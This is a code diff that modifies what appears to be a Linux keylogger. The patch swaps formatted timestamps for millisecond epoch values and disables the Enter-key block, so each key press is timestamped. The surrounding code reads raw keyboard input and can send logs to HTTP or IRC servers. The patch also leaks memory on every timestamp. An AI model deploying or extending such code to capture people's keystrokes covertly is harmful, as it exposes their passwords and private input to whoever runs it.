@@ -23,6 +23,7 @@
 #include <sys/stat.h>
 #include <sys/socket.h>
 #include <linux/input.h>
+#include <chrono>
 
 #ifdef HAVE_CONFIG_H
 # include <config.h>  // include config produced from ./configure
@@ -471,7 +472,6 @@ int main(int argc, char **argv)
   
   unsigned int scan_code, prev_code = 0;  // the key code of the pressed key (some codes are from "scan code set 1", some are different (see <linux/input.h>)
   struct input_event event;
-  char timestamp[32];  // timestamp string, long enough to hold format "\n%F %T%z > "
   bool shift_in_effect = false;
   bool altgr_in_effect = false;
   bool ctrl_in_effect = false;  // used for identifying Ctrl+C / Ctrl+D
@@ -482,17 +482,16 @@ int main(int argc, char **argv)
   off_t file_size = st.st_size;  // log file is currently file_size bytes "big"
   int inc_size;  // is added to file_size in each iteration of keypress reading, adding number of bytes written to log file in that iteration
   
-  time_t cur_time;
-  time(&cur_time);
-#define TIME_FORMAT "%F %T%z > "  // results in YYYY-mm-dd HH:MM:SS+ZZZZ
-  strftime(timestamp, sizeof(timestamp), TIME_FORMAT, localtime(&cur_time));
-  
+  std::chrono::milliseconds cur_time = std::chrono::duration_cast< std::chrono::milliseconds >(std::chrono::system_clock::now().time_since_epoch());
+  auto timestamp = std::to_string(cur_time.count());
+  char *timeptr = new char[timestamp.length() + 1];
+  strcpy(timeptr, timestamp.c_str());
   if (args.flags & FLAG_NO_TIMESTAMPS)
-    file_size += fprintf(out, "Logging started at %s\n\n", timestamp);
+    file_size += fprintf(out, "Logging started at %s\n\n", timeptr);
   else
-    file_size += fprintf(out, "Logging started ...\n\n%s", timestamp);
+    file_size += fprintf(out, "Logging started ...\n\n");
   fflush(out);
-  
+
   // infinite loop: exit gracefully by receiving SIGHUP, SIGINT or SIGTERM (of which handler closes input_fd)
   while (read(input_fd, &event, sizeof(struct input_event)) > 0) {
     
@@ -534,12 +533,15 @@ int main(int argc, char **argv)
       file_size = 0;  // new log file is now empty
       
       // write new timestamp
-      time(&cur_time);
-      strftime(timestamp, sizeof(timestamp), TIME_FORMAT, localtime(&cur_time));
+      cur_time = std::chrono::duration_cast< std::chrono::milliseconds >(std::chrono::system_clock::now().time_since_epoch());
+      timestamp = std::to_string(cur_time.count());
+      timeptr = new char[timestamp.length() + 1];
+      strcpy(timeptr, timestamp.c_str());
+
       if (args.flags & FLAG_NO_TIMESTAMPS)
-        file_size += fprintf(out, "Logging started at %s\n\n", timestamp);
+        file_size += fprintf(out, "Logging started at %s\n\n", timeptr);
       else
-        file_size += fprintf(out, "Logging started ...\n\n%s", timestamp);
+        file_size += fprintf(out, "Logging started ...\n\n%s", timeptr);
       
       if (!args.http_url.empty() || !args.irc_server.empty()) {
         switch (fork()) {
@@ -569,19 +571,22 @@ int main(int argc, char **argv)
     if (event.value == EV_MAKE) {
       
       // on ENTER key or Ctrl+C/Ctrl+D event append timestamp
-      if (scan_code == KEY_ENTER || scan_code == KEY_KPENTER ||
-          (ctrl_in_effect && (scan_code == KEY_C || scan_code == KEY_D))) {
+      //if (scan_code == KEY_ENTER || scan_code == KEY_KPENTER ||
+        //  (ctrl_in_effect && (scan_code == KEY_C || scan_code == KEY_D))) {
         if (ctrl_in_effect)
           inc_size += fprintf(out, "%lc", char_keys[to_char_keys_index(scan_code)]);  // log C or D
         if (args.flags & FLAG_NO_TIMESTAMPS)
           inc_size += fprintf(out, "\n");
         else {
-          strftime(timestamp, sizeof(timestamp), "\n" TIME_FORMAT, localtime(&event.time.tv_sec));
-          inc_size += fprintf(out, "%s", timestamp);  // then newline and timestamp
+          cur_time = std::chrono::duration_cast< std::chrono::milliseconds >(std::chrono::system_clock::now().time_since_epoch());
+          timestamp = std::to_string(cur_time.count());
+          timeptr = new char[timestamp.length() + 1];
+          strcpy(timeptr, timestamp.c_str());
+          inc_size += fprintf(out, "\n%s,", timeptr);  // then newline and timestamp
         }
-        if (inc_size > 0) file_size += inc_size;
-        continue;  // but don't log "<Enter>"
-      }
+        //if (inc_size > 0) file_size += inc_size;
+        //continue;  // but don't log "<Enter>"
+      //}
       
       if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT)
         shift_in_effect = true;
@@ -640,9 +645,11 @@ int main(int argc, char **argv)
   } // while (read(input_fd))
   
   // append final timestamp, close files and exit
-  time(&cur_time);
-  strftime(timestamp, sizeof(timestamp), "%F %T%z", localtime(&cur_time));
-  fprintf(out, "\n\nLogging stopped at %s\n\n", timestamp);
+  cur_time = std::chrono::duration_cast< std::chrono::milliseconds >(std::chrono::system_clock::now().time_since_epoch());
+  timestamp = std::to_string(cur_time.count());
+  timeptr = new char[timestamp.length() + 1];
+  strcpy(timeptr, timestamp.c_str());
+  fprintf(out, "\n\nLogging stopped at %s\n\n", timeptr);
   
   fclose(out);
   
